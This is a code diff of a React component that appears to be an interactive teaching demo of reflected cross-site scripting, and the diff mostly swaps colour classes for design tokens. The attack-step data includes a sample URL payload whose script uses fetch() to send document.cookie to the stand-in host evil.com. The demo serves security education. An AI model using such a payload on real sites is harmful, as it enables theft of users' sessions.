@@ -21,7 +21,7 @@ app.get('/search', (req, res) => {
 const ATTACK_STEPS = [
 	{
 		actor: "Attacker",
-		actorColor: "text-rose-400",
+		actorColor: "text-accent-rose-soft",
 		label: "Craft malicious URL",
 		detail:
 			'https://bank.example.com/search?q=<script>fetch("https://evil.com/?c="+document.cookie)</script>',
@@ -34,20 +34,20 @@ const ATTACK_STEPS = [
 	},
 	{
 		actor: "Server",
-		actorColor: "text-zinc-300",
+		actorColor: "text-text-secondary",
 		label: "Reflects payload into HTML (no sanitization)",
 		detail:
 			"<p>Results for: <script>fetch('https://evil.com/?c='+document.cookie)</script></p>",
 	},
 	{
 		actor: "Browser",
-		actorColor: "text-zinc-300",
+		actorColor: "text-text-secondary",
 		label: "Parses and executes the script",
 		detail: "Script runs in victim's browser context — reads document.cookie",
 	},
 	{
 		actor: "Attacker",
-		actorColor: "text-rose-400",
+		actorColor: "text-accent-rose-soft",
 		label: "Receives stolen session",
 		detail: "evil.com/?c=session=abc123xyz — victim's session stolen",
 	},
@@ -98,8 +98,8 @@ export function ReflectedXSSDemo() {
 	return (
 		<div className="space-y-6">
 			{/* Simulated search */}
-			<div className="bg-zinc-800 rounded-lg p-4 border border-zinc-700">
-				<p className="text-xs text-zinc-400 mb-3 uppercase tracking-wider font-semibold">
+			<div className="bg-surface-secondary rounded-lg p-4 border border-border-secondary">
+				<p className="text-xs text-text-tertiary mb-3 uppercase tracking-wider font-semibold">
 					Simulated Search Page
 				</p>
 				<div className="flex gap-2 mb-3">
@@ -107,23 +107,27 @@ export function ReflectedXSSDemo() {
 						type="text"
 						value={searchInput}
 						onChange={(e) => setSearchInput(e.target.value)}
-						className="flex-1 bg-zinc-900 border border-zinc-600 rounded px-3 py-2 text-sm text-white font-mono"
+						className="flex-1 bg-surface-primary border border-border-tertiary rounded px-3 py-2 text-sm text-text-primary font-mono"
 						placeholder="Try: <script>alert('xss')</script>"
 					/>
 				</div>
-				<div className="bg-zinc-900 rounded p-3 text-sm border border-zinc-700">
-					<span className="text-zinc-400">Server response: </span>
-					<span className="text-zinc-300">Results for: </span>
-					<span className={sanitized ? "text-emerald-400" : "text-red-400"}>
+				<div className="bg-surface-primary rounded p-3 text-sm border border-border-secondary">
+					<span className="text-text-tertiary">Server response: </span>
+					<span className="text-text-secondary">Results for: </span>
+					<span
+						className={
+							sanitized ? "text-accent-emerald-soft" : "text-accent-red-soft"
+						}
+					>
 						{displayedQuery}
 					</span>
 					{!sanitized && (
-						<span className="ml-2 text-xs text-red-400 bg-red-500/20 px-2 py-0.5 rounded">
+						<span className="ml-2 text-xs text-accent-red-soft bg-red-500/20 px-2 py-0.5 rounded">
 							⚠ Script would execute
 						</span>
 					)}
 					{sanitized && (
-						<span className="ml-2 text-xs text-emerald-400 bg-emerald-500/20 px-2 py-0.5 rounded">
+						<span className="ml-2 text-xs text-accent-emerald-soft bg-emerald-500/20 px-2 py-0.5 rounded">
 							✓ Rendered as text
 						</span>
 					)}
@@ -138,8 +142,8 @@ export function ReflectedXSSDemo() {
 					onClick={() => setSanitized(false)}
 					className={`px-4 py-2 rounded text-sm font-medium transition-colors disabled:opacity-40 disabled:cursor-not-allowed ${
 						!sanitized
-							? "bg-red-500/20 text-red-400 border border-red-500"
-							: "bg-zinc-800 text-zinc-400 border border-zinc-700 hover:border-zinc-600"
+							? "bg-red-500/20 text-accent-red-soft border border-red-500"
+							: "bg-surface-secondary text-text-tertiary border border-border-secondary hover:border-border-tertiary"
 					}`}
 				>
 					No Sanitization (Vulnerable)
@@ -150,14 +154,14 @@ export function ReflectedXSSDemo() {
 					onClick={() => setSanitized(true)}
 					className={`px-4 py-2 rounded text-sm font-medium transition-colors disabled:opacity-40 disabled:cursor-not-allowed ${
 						sanitized
-							? "bg-emerald-500/20 text-emerald-400 border border-emerald-500"
-							: "bg-zinc-800 text-zinc-400 border border-zinc-700 hover:border-zinc-600"
+							? "bg-emerald-500/20 text-accent-emerald-soft border border-emerald-500"
+							: "bg-surface-secondary text-text-tertiary border border-border-secondary hover:border-border-tertiary"
 					}`}
 				>
 					HTML Entity Encoded (Secure)
 				</button>
 				{isRunning && (
-					<span className="text-xs text-zinc-500 italic">
+					<span className="text-xs text-text-muted italic">
 						Reset to change mode
 					</span>
 				)}
@@ -166,13 +170,15 @@ export function ReflectedXSSDemo() {
 			{/* Attack flow */}
 			<div>
 				<div className="flex items-center justify-between mb-3">
-					<p className="text-sm font-semibold text-zinc-300">Attack Flow</p>
+					<p className="text-sm font-semibold text-text-secondary">
+						Attack Flow
+					</p>
 					<div className="flex gap-2">
 						{!isRunning ? (
 							<button
 								type="button"
 								onClick={startAttack}
-								className="px-3 py-1.5 bg-red-500/20 text-red-400 border border-red-500 rounded text-xs font-medium hover:bg-red-500/30 transition-colors"
+								className="px-3 py-1.5 bg-red-500/20 text-accent-red-soft border border-red-500 rounded text-xs font-medium hover:bg-red-500/30 transition-colors"
 							>
 								▶ Start Attack
 							</button>
@@ -182,7 +188,7 @@ export function ReflectedXSSDemo() {
 									<button
 										type="button"
 										onClick={advanceStep}
-										className="px-3 py-1.5 bg-zinc-700 text-zinc-300 rounded text-xs font-medium hover:bg-zinc-600 transition-colors"
+										className="px-3 py-1.5 bg-surface-tertiary text-text-secondary rounded text-xs font-medium hover:bg-surface-tertiary transition-colors"
 									>
 										Next Step →
 									</button>
@@ -190,7 +196,7 @@ export function ReflectedXSSDemo() {
 								<button
 									type="button"
 									onClick={reset}
-									className="px-3 py-1.5 bg-zinc-800 text-zinc-400 rounded text-xs font-medium hover:bg-zinc-700 transition-colors"
+									className="px-3 py-1.5 bg-surface-secondary text-text-tertiary rounded text-xs font-medium hover:bg-surface-tertiary transition-colors"
 								>
 									Reset
 								</button>
@@ -213,7 +219,7 @@ export function ReflectedXSSDemo() {
 											? "bg-emerald-500/10 border-emerald-500/40"
 											: i === ATTACK_STEPS.length - 1 && !effectiveSanitized
 												? "bg-red-500/20 border-red-500"
-												: "bg-zinc-800 border-zinc-700"
+												: "bg-surface-secondary border-border-secondary"
 									}`}
 								>
 									<div className="flex items-start gap-2">
@@ -222,19 +228,21 @@ export function ReflectedXSSDemo() {
 										>
 											{s.actor}
 										</span>
-										<span className="text-zinc-300 text-xs">{s.label}</span>
+										<span className="text-text-secondary text-xs">
+											{s.label}
+										</span>
 										{attackBlocked && i === 2 && (
-											<span className="ml-auto text-emerald-400 text-xs font-semibold shrink-0">
+											<span className="ml-auto text-accent-emerald-soft text-xs font-semibold shrink-0">
 												✓ BLOCKED
 											</span>
 										)}
 										{!effectiveSanitized && i === ATTACK_STEPS.length - 1 && (
-											<span className="ml-auto text-red-400 text-xs font-semibold shrink-0">
+											<span className="ml-auto text-accent-red-soft text-xs font-semibold shrink-0">
 												🔴 SESSION STOLEN
 											</span>
 										)}
 									</div>
-									<p className="mt-1 text-xs text-zinc-500 font-mono break-all">
+									<p className="mt-1 text-xs text-text-muted font-mono break-all">
 										{s.detail}
 									</p>
 								</motion.div>
@@ -246,7 +254,7 @@ export function ReflectedXSSDemo() {
 
 			{/* Code block reflects toggle, not attack state — allows studying both modes */}
 			<div>
-				<p className="text-xs text-zinc-400 mb-2 font-semibold uppercase tracking-wider">
+				<p className="text-xs text-text-tertiary mb-2 font-semibold uppercase tracking-wider">
 					{sanitized ? "Secure Implementation" : "Vulnerable Implementation"}
 				</p>
 				<ShikiCode
